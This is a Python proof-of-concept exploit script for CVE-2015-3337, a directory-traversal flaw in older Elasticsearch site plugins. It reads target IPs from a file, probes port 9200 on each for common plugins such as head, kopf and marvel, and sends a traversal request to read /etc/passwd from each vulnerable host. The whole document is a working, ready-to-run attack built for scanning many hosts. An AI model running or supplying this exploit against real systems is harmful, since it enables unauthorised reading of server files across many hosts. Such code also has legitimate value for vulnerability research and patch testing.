#!/usr/bin/python
# Crappy PoC for CVE-2015-3337 - Reported by John Heasman of DocuSign
# Affects all ElasticSearch versions prior to 1.5.2 and 1.4.5
# Pedro Andujar || twitter: pandujar || email: @segfault.es || @digitalsec.net
# Tested on default Linux (.deb) install /usr/share/elasticsearch/plugins/
#
# Source: https://github.com/pandujar/elasticpwn/
 
import socket, sys

fpath = '/etc/passwd'

def grab(host, port, plugin):
        socket.setdefaulttimeout(3)
        s = socket.socket()
        s.connect((host,port))
        s.send("GET /_plugin/%s/../../../../../..%s HTTP/1.0\n"
            "Host: %s\n\n" % (plugin, fpath, host))
        file = s.recv(2048)
        print " [*] Trying to retrieve %s:" % fpath
        if ("HTTP/1.0 200 OK" in file):
            #print "\n%s" % file
            print '[+].....find remote plugin path http://%s:9200/_plugin/%s/../../../../../../etc/passwd' % (host, plugin)
        else:
            print "[-] File Not Found, No Access Rights or System Not Vulnerable"
 
def pfind(host, port , plugin):
    try:
        socket.setdefaulttimeout(3)
        s = socket.socket()
        s.connect((host,port))
        s.send("GET /_plugin/%s/ HTTP/1.0\n"
            "Host: %s\n\n" % (plugin, host))
        file = s.recv(16)
        print "[*] Trying to find plugin %s:" % plugin
        if ("HTTP/1.0 200 OK" in file):
            #print "[+] %s Plugin found!" % plugin
            grab(host, port , plugin)
            #sys.exit()
        else:
            #print "[-]  Not Found "
            pass
    except Exception, e:
        print "[-] Error connecting to %s: %s" % (host, e)
        #sys.exit()
 
# Include more plugin names to check if they are installed
pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']

def main():
    port = 9200
    with open('eas.cvs') as file:
        for item in file.readlines():
            ip = item.strip(" \r\n")
            for plugin in pluginList:
                pfind(ip, port, plugin)

            print '[-] %s Scan Over!' %ip

if __name__ == '__main__':
    main()